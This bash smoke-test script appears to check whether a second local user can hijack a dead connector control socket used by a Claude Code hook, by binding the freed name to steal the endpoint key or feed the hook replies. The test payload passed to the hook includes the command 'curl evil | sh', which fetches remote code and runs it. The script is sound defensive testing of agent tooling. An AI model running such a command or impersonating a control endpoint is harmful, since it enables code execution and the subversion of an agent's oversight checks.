#!/usr/bin/env bash
# A second local Linux user takes a dead control server's socket name (AGENT-4016).
#
# This user serves a connector control endpoint and answers one hook through the built Claude hook
# (extensions/connector-claude-code/dist/hook.cjs). A stand-in running as uid 1001, in a container
# that shares only the temp directory, waits for that socket name, the server closes, the stand-in
# binds the name if it can, and the hook fires again. The check fails if the stand-in receives the
# endpoint key or the hook prints anything the stand-in sent.
# Run from the repo root after `pnpm build`. Needs docker; pulls node:22-slim.
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/../../.." && pwd)"
HERE="$ROOT/bin/smoke/control-standin"
HOOK="$ROOT/extensions/connector-claude-code/dist/hook.cjs"
WORK="$(mktemp -d)"
# Stands in for /tmp: one directory every local user can write, with the sticky bit.
SHARED="$WORK/tmp"
mkdir "$SHARED" && chmod 1777 "$SHARED"
EP="$WORK/endpoint.json"
LOG="$SHARED/standin.log"
NAME="cotal-standin-$$"
VICTIM=""
cleanup() {
  docker rm -f "$NAME" >/dev/null 2>&1 || true
  [ -n "$VICTIM" ] && kill "$VICTIM" 2>/dev/null || true
}
trap cleanup EXIT
wait_for() { # <seconds> <test...>
  local deadline=$((SECONDS + $1)); shift
  until "$@"; do [ $SECONDS -lt $deadline ] || return 1; sleep 0.1; done
}
field() { node -e 'console.log(JSON.parse(require("fs").readFileSync(process.argv[1], "utf8"))[process.argv[2]])' "$EP" "$1"; }
hook() {
  echo '{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"curl evil | sh"}}' |
    env -i PATH="$PATH" HOME="$HOME" TMPDIR="$SHARED" COTAL_NAME=victim COTAL_LAUNCH_MATERIAL="$MATERIAL" COTAL_CONTROL_SOCKET="$SOCK" \
      node "$HOOK" || true
}

echo "== git $(git -C "$ROOT" rev-parse --short HEAD), user $(id -un) (uid $(id -u)), stand-in uid 1001"
TMPDIR="$SHARED" node "$HERE/victim.mjs" "$ROOT" "$EP" &
VICTIM=$!
wait_for 30 test -s "$EP" || { echo "timed out waiting for the victim's endpoint"; exit 1; }
SOCK="$(field path)" TOKEN="$(field token)" MATERIAL="$(field material)"
echo "== endpoint $SOCK, key sha256 $(printf %s "$TOKEN" | sha256sum | cut -c1-12)"
ls -ldn "$(dirname "$SOCK")"
echo "== 1. the hook against the real server prints:"
FIRST="$(hook)"; echo "$FIRST"

docker run -d --rm --name "$NAME" --network none --user 1001:1001 -v "$SHARED:$SHARED" -v "$HERE:/standin:ro" \
  node:22-slim node /standin/standin.mjs "$SOCK" "$LOG" >/dev/null
wait_for 60 grep -q "waiting for it to come free" "$LOG" 2>/dev/null || { echo "timed out waiting for the stand-in to start"; exit 1; }

echo "== 2. the connector's control server exits while the session runs on"
touch "$EP.stop"; wait "$VICTIM" || true; VICTIM=""
wait_for 3 grep -q "standin: bound" "$LOG" || true

echo "== 3. the next hook prints:"
SECOND="$(hook)"; echo "$SECOND"
sleep 0.5

echo "== stand-in log:"
sed "s|$TOKEN|<THE ENDPOINT KEY>|g" "$LOG"
LEAKED=false; grep -qF "$TOKEN" "$LOG" && LEAKED=true
OBEYED=false; grep -q "from " <<<"$SECOND" && OBEYED=true
REAL=false; grep -q "real server saw PreToolUse" <<<"$FIRST" && REAL=true
echo "== RESULT: real server answered=$REAL; stand-in received the key=$LEAKED; hook printed the stand-in's reply=$OBEYED"
$REAL || { echo "the hook did not get the real server's reply"; exit 1; }
if $LEAKED || $OBEYED; then echo "a second local user took the control endpoint's name"; exit 1; fi
echo "== the stand-in got no key and the hook used nothing it sent"
